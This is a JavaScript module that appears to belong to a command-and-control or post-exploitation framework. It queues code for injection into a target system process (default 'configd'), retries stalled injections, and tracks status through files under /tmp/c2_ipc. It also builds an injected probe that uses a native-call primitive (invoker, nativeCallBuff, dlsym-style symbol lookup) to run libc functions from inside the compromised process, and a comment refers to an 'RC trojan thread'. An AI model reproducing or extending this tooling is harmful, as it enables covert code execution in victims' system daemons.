// Session eval stale/retry (hot via pe_load / payload/get). Cold pe_main embeds stub only.
(function (g) {
	var VER = "0.1.2";
	if (g.__peSessionEval && g.__peSessionEval.ver === VER) return;
	// Allow hot upgrade when ver changes (old guard blocked reloads forever).
	if (g.__peSessionEval && g.__peSessionEval.ver && g.__peSessionEval.ver !== VER) {
		try {
			if (typeof console !== "undefined" && console.log) {
				console.log("[pe_session_eval] upgrade " + g.__peSessionEval.ver + " -> " + VER);
			}
		} catch (_) {}
	}
	var STALE_MS = 30000;
	var MAX_RETRY = 3;
	var RETRY_GAP_MS = 5000;

	function isTerminal(st) {
		return st === "eval_ok" || st === "eval_fail" || st === "eval_no_file";
	}
	function isPending(st) {
		return st === "eval_start" || st === "eval_loading" || st === "eval_injected";
	}

	function syncProbeCode(sid, target, payload) {
		var sidJ = JSON.stringify(String(sid));
		var tgtJ = JSON.stringify(String(target || "configd"));
		var payJ = JSON.stringify(String(payload || "probe"));
		// Embed minimal Native (new JSContext has invoker+nativeCallBuff only).
		return (
			"class Native{static init(){const b=new BigUint64Array(nativeCallBuff);this.B=b[20];this.D=b[21];this.C=b[22];this.M=b[23];this.arg=this.nc(this.M,4096n);}" +
			"static nc(a,x0,x1,x2,x3){let b=new BigInt64Array(nativeCallBuff);b[0]=a;b[100]=x0||0n;b[101]=x1||0n;b[102]=x2||0n;b[103]=x3||0n;invoker();return b[200];}" +
			"static dl(n){let u=new Uint8Array(nativeCallBuff);for(let i=0;i<n.length;i++)u[0x1000+i]=n.charCodeAt(i);u[0x1000+n.length]=0;return this.nc(this.D,-2n,this.B+0x1000n);}" +
			"static ws(p,s){let a=new Uint8Array(s.length+1);for(let i=0;i<s.length;i++)a[i]=s.charCodeAt(i);let u=new Uint8Array(nativeCallBuff);u.set(a,0x1000);this.nc(this.C,p,this.B+0x1000n,BigInt(a.length));}" +
			"static callSymbol(n,a,b,c,d){if(typeof a==='string'){let p=this.arg;this.ws(p,a);a=p;}if(typeof b==='string'){let p=this.arg+512n;this.ws(p,b);b=p;}return this.nc(this.dl(n),a||0n,b||0n,c||0n,d||0n);}}" +
			"(function(){try{Native.init();var sid=" + sidJ + ";" +
			"var body=JSON.stringify({ts:Date.now(),session_id:sid,state:'eval_ok',via:'async_probe',target:" + tgtJ + ",payload:" + payJ + "})+'\\n';" +
			"var p='/tmp/c2_ipc/session.'+sid+'.eval';" +
			"var fd=Native.callSymbol('fopen',p,'w');if(!fd)throw new Error('fopen_fail');" +
			"var nb=Native.callSymbol('calloc',1,body.length+1);Native.ws(nb,body);" +
			"Native.callSymbol('fwrite',nb,1,body.length,fd);Native.callSymbol('fclose',fd);Native.callSymbol('free',nb);" +
			"var hfd=Native.callSymbol('fopen','/tmp/c2_ipc/session.'+sid+'.hb','w');if(hfd)Native.callSymbol('fclose',hfd);" +
			"}catch(e){try{var sid2=" + sidJ + ";var em=JSON.stringify({ts:Date.now(),session_id:sid2,state:'eval_fail',via:'async_probe',error:String(e).slice(0,120)})+'\\n';" +
			"var efd=Native.callSymbol('fopen','/tmp/c2_ipc/session.'+sid2+'.eval','w');" +
			"if(efd){var eb=Native.callSymbol('calloc',1,em.length+1);Native.ws(eb,em);Native.callSymbol('fwrite',eb,1,em.length,efd);Native.callSymbol('fclose',efd);Native.callSymbol('free',eb);}}" +
			"catch(_){}}})();"
		);
	}

	function touchProgress(ctx, sid, s, eo) {
		if (eo && isTerminal(eo.state)) return true;
		var hb = ctx.readUtf8("/tmp/c2_ipc/session." + sid + ".hb", 512);
		if (hb && hb.length > 8) {
			if (s.last_hb_snapshot !== hb) {
				s.last_hb_snapshot = hb;
				s.last_progress_ts = Date.now();
				return true;
			}
		}
		var st = ctx.readUtf8("/tmp/c2_ipc/session." + sid + ".status", 2048);
		if (st && (st.indexOf('"eval_ok":true') >= 0 || st.indexOf('"stage":"scanning"') >= 0)) {
			s.last_progress_ts = Date.now();
			return true;
		}
		return false;
	}

	function pollEvals(ctx) {
		var sess = ctx.sessions || {};
		var keys = Object.keys(sess);
		for (var i = 0; i < keys.length; i++) {
			var sid = keys[i];
			var s = sess[sid];
			if (!s || !s.eval_pending) continue;
			var eo = ctx.readEvalState(sid);
			if (!eo || !eo.state) continue;
			if (isPending(eo.state)) {
				touchProgress(ctx, sid, s, eo);
				continue;
			}
			s.eval_pending = false;
			s.eval_state = eo.state;
			s.eval_ts = Date.now();
			if (eo.state === "eval_ok") {
				ctx.log("[PE-LISTEN] session_eval ok id=" + sid + " via=" + (eo.via || "async"));
				ctx.writeStatus(sid, {
					state: "running",
					ok: true,
					pid: s.pid || 0,
					target: s.target || "",
					payload: s.payload || "",
					eval_ok: true,
					via: eo.via || ""
				});
				if ((eo.via === "sync_probe" || eo.via === "async_probe") && s.full_code && !s.full_after_probe) {
					s.full_after_probe = true;
					s.eval_pending = true;
					s.eval_retry = 0;
					s.inject_ts = 0;
					s.last_progress_ts = 0;
					s.last_hb_snapshot = "";
					ctx.requeue({
						sid: sid,
						target: s.target,
						payload: s.payload,
						code: s.full_code,
						full_code: s.full_code,
						sync_eval: false,
						queued_ts: Date.now(),
						phase: "full_after_probe"
					});
					ctx.log("[PE-LISTEN] session_eval probe ok -> requeue full sid=" + sid);
					continue;
				}
			} else if (eo.state === "eval_fail" || eo.state === "eval_no_file") {
				ctx.log("[PE-LISTEN] session_eval fail id=" + sid + " " + String(eo.error || eo.state).slice(0, 80));
				s.state = "eval_fail";
				ctx.writeStatus(sid, {
					state: "eval_fail",
					ok: false,
					error: eo.error || eo.state,
					target: s.target || "",
					payload: s.payload || ""
				});
			}
			if (s.inject_lock) {
				ctx.releaseLock(s.inject_lock);
				s.inject_lock = "";
			}
		}
	}

	function staleTick(ctx) {
		var now = Date.now();
		var sess = ctx.sessions || {};
		var keys = Object.keys(sess);
		for (var i = 0; i < keys.length; i++) {
			var sid = keys[i];
			var s = sess[sid];
			if (!s || !s.eval_pending) continue;
			if (!s.inject_ts) continue;
			var eo = ctx.readEvalState(sid);
			if (eo && isTerminal(eo.state) && eo.via !== "sync_probe") continue;
			touchProgress(ctx, sid, s, eo);
			var lastProg = Number(s.last_progress_ts || s.inject_ts || 0);
			if (now - lastProg < STALE_MS) continue;
			var retry = Number(s.eval_retry || 0);
			if (retry >= MAX_RETRY) {
				ctx.log("[PE-LISTEN] session_eval stale max_retry sid=" + sid + " n=" + retry);
				s.eval_pending = false;
				s.state = "eval_fail";
				s.eval_state = "eval_fail";
				ctx.writeEval(sid, { state: "eval_fail", error: "eval_stale_max_retry", retry: retry });
				ctx.writeStatus(sid, {
					state: "eval_fail",
					ok: false,
					error: "eval_stale_max_retry",
					target: s.target || "",
					payload: s.payload || ""
				});
				if (s.inject_lock) {
					ctx.releaseLock(s.inject_lock);
					s.inject_lock = "";
				}
				continue;
			}
			var lastRetry = Number(s.last_retry_ts || 0);
			if (lastRetry && now - lastRetry < RETRY_GAP_MS) continue;
			retry += 1;
			s.eval_retry = retry;
			s.last_retry_ts = now;
			s.inject_ts = 0;
			s.last_progress_ts = 0;
			s.last_hb_snapshot = "";
			ctx.log("[PE-LISTEN] session_eval stale retry sid=" + sid + " n=" + retry + "/" + MAX_RETRY);
			try {
				ctx.unlink("/tmp/c2_ipc/session." + sid + ".eval");
			} catch (_) {}
			// Never syncEval into configd: evaluateScript on RC trojan thread deadlocks invoker (~10s).
			var useProbe = retry >= 2;
			var code = useProbe ? syncProbeCode(sid, s.target, s.payload) : (s.full_code || "");
			if (!code) continue;
			ctx.requeue({
				sid: sid,
				target: s.target || "configd",
				payload: s.payload || "probe",
				code: code,
				full_code: s.full_code || code,
				sync_eval: false,
				retry: retry,
				queued_ts: now,
				phase: useProbe ? "async_probe" : "retry_async"
			});
			s.eval_pending = true;
			if (s.inject_lock) {
				ctx.releaseLock(s.inject_lock);
				s.inject_lock = "";
			}
		}
	}

	g.__peSessionEval = {
		ver: VER,
		STALE_MS: STALE_MS,
		MAX_RETRY: MAX_RETRY,
		RETRY_GAP_MS: RETRY_GAP_MS,
		syncProbeCode: syncProbeCode,
		pollEvals: pollEvals,
		staleTick: staleTick
	};
})(typeof globalThis !== "undefined" ? globalThis : this);
